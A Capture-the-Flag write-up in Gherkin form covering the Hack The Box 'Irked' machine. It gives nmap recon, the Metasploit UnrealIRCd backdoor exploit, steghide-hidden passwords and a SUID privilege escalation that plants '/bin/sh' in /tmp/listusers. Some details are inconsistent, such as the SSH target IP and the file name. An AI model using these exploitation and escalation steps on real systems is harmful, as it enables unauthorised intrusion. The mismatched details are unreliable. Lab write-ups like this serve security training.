## Version 2.0
## language: en

Feature:
  Site:
    Hack The Box
  Category:
    CTF
  User:
    aramirez95
  Goal:
    Get user and root flags

  Background:
  Hacker's software:
    | <Software name> | <Version>   |
    | Kali Linux      | 2020.1      |
    | Firefox Quantum | 68.2Oesr    |
    | Nmap            | 7.80        |
    | Metasploit      | 5.0.73-dev  |
    | Steghide        | 0.5.1       |
  Machine information:
    Given the machine 10.10.10.117 is on
    When I execute a ping command

  Scenario: Information gathering
    Given that I run the following Nmap command
    """
    $ nmap -sV 10.10.10.117 --open
    """
    When I see the command ends
    Then I get to see the result
    """
    PORT    STATE SERVICE VERSION
    22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
    80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
    111/tcp open  rpcbind 2-4 (RPC #100000)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    """
    And I can see that it has a service HTTP
    When I decide to run port 80
    Then a web page with a single image and a text comes out
    And I download the image to scan it later
    When I make the decision to execute a command to see if that port has any endpoint
    """
    $ gobuster dir -u http://10.10.10.117/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
    """
    And I see that it does not have an external service that is interesting
    When I go back to the website I analyze the code
    Then I see that it has nothing interesting, but it has a text that catches my attention
    """
    <b>IRC is almost working!</b>
    """
    And I decide to check if there is any port with an IRC service
    """
    $ nmap -p- -sV 10.10.10.117 --open
    """
    When I see that it has several ports with an IRC service
    """
    PORT      STATE SERVICE VERSION
    22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
    80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
    111/tcp   open  rpcbind 2-4 (RPC #100000)
    6697/tcp  open  irc     UnrealIRCd
    8067/tcp  open  irc     UnrealIRCd
    39777/tcp open  status  1 (RPC #100024)
    65534/tcp open  irc     UnrealIRCd
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    """
    Then I look for some exploit for IRC
    """
    $ searchsploit UnrealIRCd
    """
    And it has an exploit to run with metasploit
    """
    UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit) | exploits/linux/remote/16922.rb
    UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow | exploits/windows/dos/18011.txt
    UnrealIRCd 3.2.8.1 - Remote Downloader/Execute | exploits/linux/remote/13853.pl
    UnrealIRCd 3.x - Remote Denial of Service    
    """

  Scenario: Fail: Image scan
    Given I downloaded an image
    When I make the decision to scan the image
    """
    $ steghide extract -sf irked.jpg
    """
    And unfortunately he asks me for a password

  Scenario: Success: Meterpreter
    Given the machine has an exploit for IRC
    When I start looking for the exploit
    """
    msf5 > search UnrealIRC
    """
    Then I find an exploit
    """
    exploit/unix/irc/unreal_ircd_3281_backdoor
    """
    And I decide to use it
    """
    msf5> use exploit/unix/irc/unreal_ircd_3281_backdoor
    """
    When I start to see the settings
    """
    msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options
    """
    Then I see that RHOSTS and RPORT are needed
    """
    Name    Current Setting  Required
   ----    ---------------  --------
    RHOSTS                   yes
    RPORT   6667             yes  
    """
    And I decide to start with RHOSTS
    """
    msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 10.10.10.117
    """
    When I see that RPORT is not the one indicated
    Then I decide to change it to a port that I found with "nmap" command
    """
    msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 8067
    """
    And finally I run the exploit
    """
    msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
    """

  Scenario: Success: file user.txt
    Given I already have access to a meterpreter
    When I decide to look where I am
    Then I execute the "pwd" command to know my location
    And this result comes out
    """
    /home/ircd/Unreal3.2
    """
    When I make the decision to go to HOME to see which users there are
    """
    $ cd /home
    """
    Then I execute an instruction to list the contents
    """
    $ ls
    """
    And I see that it has two users
    """
    $ djmardov ircd
    """
    When I decide to enter the djmardov route
    """
    $ cd djmardov
    """
    Then I use a command to go to the Documents folder
    """
    $ cd Documents
    """
    And I execute an instruction to list the contents
    """
    $ ls
    """
    Then I see that there is a user.txt

  Scenario: Fail: user.txt file permissions
    Given I found a user.txt file
    When I decide to see its contents with the "cat" command 
    And unfortunately I don't have permits

  Scenario: Success: Get pass1
    Given I am in Documents of the user djmardov
    When I decide to see the hidden files
    """
    $ ls -la
    """
    Then I get this result
    """
    -rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
    -rw-------  1 djmardov djmardov   33 May 15  2018 user.txt
    """
    And I decide to see the contents of the .backup file with "cat" command
    When I find pass1
    """
    UPupDOWNdownLRlrBAbaSSss
    """

  Scenario: Fail: Access SSH
    Given I have a pass1
    When I decide to run that pass1 in SSH
    """
    $ ssh djmardov@10.10.10.4
    """
    And unfortunately the password does not work

  Scenario: Success: Image Scan
    Given that the pass1 did not work with SSH
    When I test the pass1 with the image I download like this
    """
    $ steghide extract -sf irked.jpg
    """
    Then I see that it has worked
    And the content is this file
    """
    $ pass.txt
    """
    When I decide to try the "cat" command
    """
    $ cat pass.txt
    """
    And I see that it contains a pass2
    """
    $ Kab6h+m+bbp2J:HG
    """

  Scenario: Success: Getting User Flag
    Given I have a pass2
    When I decided to try again with SSH
    """
    $ ssh djmardov@10.10.10.4
    """
    Then I see that the password does work
    And I decide to go to documents again
    """
    djmardov@irked:~$ cd Documents
    """
    When I enumerate the files again
    """
    djmardov@irked:~/Documents$ ls
    """
    Then I see that the user.txt file is found
    And I execute the "cat" command
    When I see that I have the user flag
    """
    # FLAG USER = <FLAG>
    """

  Scenario: Fail: permissions to access the folder
    Given I already found the user flag
    When I decide to go to the "/" path
    """
    djmardov@irked:~/Documents$ cd /
    """
    Then I see that it has a folder called "root"
    And I don't have permissions to access the folder

  Scenario: Success: Getting Root Flag
    Given I don't have access to the root folder
    When I decide to see my UID
    """
    djmardov@irked:~/Documents$ id
    """
    Then I realize that the UID is not root
    """
    uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),
    25(floppy),29(audio),30(dip),44(video),46(plugdev),
    108(netdev),110(lpadmin),113(scanner),117(bluetooth)
    """
    When I decide to increase privileges
    And for that I execute this instruction
    """
    djmardov@irked:~/Documents$ find / -perm -u=s -type f 2>/dev/null
    """
    When I see that there is a file that catches my attention
    """
    $ /usr/bin/viewuser
    """
    Then if I run that file it will generate an error
    And it's because there is no file
    """
    $ /tmp/listuser
    """
    When I decide to use a fork
    """
    ~/Documents$ echo '/bin/sh' > /tmp/listusers
    """
    Then the listeruser file was created with the previous fork
    And I must enable all permissions
    """
    ~/Documents$ chmod 777 /tmp/listusers
    """
    When the permissions are enabled, we rerun the file
    """
    $ /usr/bin/viewuser
    """
    And I'm already in a terminal but with SUID permissions
    When I make the decision to return to the root folder
    Then I decide to enter that folder again
    And executed an "ls" command
    When I see that there is a root.txt file
    Then it is just to execute a "cat" command to see the flag
    """
    # FLAG ROOT = <FLAG>
    """

  
